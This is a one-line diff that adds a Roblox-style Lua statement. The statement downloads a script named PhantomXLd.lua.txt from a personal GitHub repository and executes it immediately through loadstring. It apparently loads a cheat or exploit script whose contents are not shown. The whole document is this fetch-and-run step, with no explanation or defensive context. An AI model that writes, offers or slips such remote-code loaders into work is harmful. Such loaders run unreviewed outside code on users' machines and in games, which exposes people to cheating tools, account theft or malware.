@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cypher666-oss/Ld-/main/PhantomXLd.lua.txt"))()
